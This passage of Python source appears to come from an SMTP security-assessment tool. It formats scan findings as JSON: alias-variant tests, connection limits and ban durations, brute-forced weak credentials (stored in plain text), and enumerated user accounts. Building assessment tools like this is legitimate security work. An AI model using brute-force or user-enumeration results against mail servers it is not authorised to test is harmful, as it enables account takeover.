            properties.update({"aliasTestError": al_err})
        elif (al := self.results.alias_test) is not None:
            properties.update({
                "aliasTest": {
                    "baseAddress": al.base_address,
                    "elapsedSec": round(al.elapsed_sec, 2),
                    "detail": al.detail,
                    "verificationInstructions": al.verification_instructions,
                    "variants": [
                        {
                            "variant": v.variant,
                            "address": v.address,
                            "accepted": v.accepted,
                            "rejected": v.rejected,
                            "error": v.error,
                            "smtpStatus": v.smtp_status,
                            "smtpReply": v.smtp_reply,
                            "detail": v.detail,
                            "uucpWarning": v.uucp_warning,
                        }
                        for v in al.variants
                    ],
                }
            })

        # Connections
        if (max_connections_error := self.results.max_connections_error) is not None:
            properties.update({"maxConnectionsError": max_connections_error})
        elif max_con := self.results.max_connections:
            if max_con.max is None:
                properties.update({"maxConnections": None})
            else:
                properties.update({"maxConnections": max_con.max})
                if max_con.ban_minutes is None:
                    properties.update({"banDuration": None})
                else:
                    properties.update({"banDuration": max_con.ban_minutes})

        # Login bruteforce
        if (creds := self.results.creds) is not None:
            if len(creds) > 0:
                json_lines: list[str] = []
                for cred in creds:
                    json_lines.append(f"user: {cred.user}, password: {cred.passw}")

                if self.args.user is not None:
                    user_str = f"username: {self.args.user}"
                else:
                    user_str = f"usernames: {self.args.users}"

                if self.args.password is not None:
                    passw_str = f"password: {self.args.password}"
                else:
                    passw_str = f"passwords: {self.args.passwords}"

                global_vulns.append(
                    {
                        "vuln_code": VULNS.WeakCreds.value,
                        "vuln_request": f"{user_str}\n{passw_str}",
                        "vuln_response": "\n".join(json_lines),
                    }
                )

        # Create main software node (vulnerabilities are always global)
        smtp_node = self.ptjsonlib.create_node_object(
            "software",
            None,
            None,
            properties,
        )
        self.ptjsonlib.add_node(smtp_node)

        # Create userAccount child nodes for enumerated users
        if (enum_results := self.results.enum_results) is not None:
            for e in enum_results:
                if e.vulnerable and e.results is not None:
                    for user in sorted(e.results, key=str):
                        local_part = str(user).split("@")[0] if "@" in str(user) else str(user)
                        user_props = {"name": local_part, "email": str(user)}
                        user_node = self.ptjsonlib.create_node_object(
                            "userAccount",
                            parent_type="userAccounts",
                            parent=None,
                            properties=user_props,
                        )
                        self.ptjsonlib.add_node(user_node)

        # All vulnerabilities go to global results.vulnerabilities[]
        for v in global_vulns:
            self.ptjsonlib.add_vulnerability(**v)

        self.ptjsonlib.set_status("finished", "")
        self.ptprint(self.ptjsonlib.get_result_json(), json=True)


# endregion
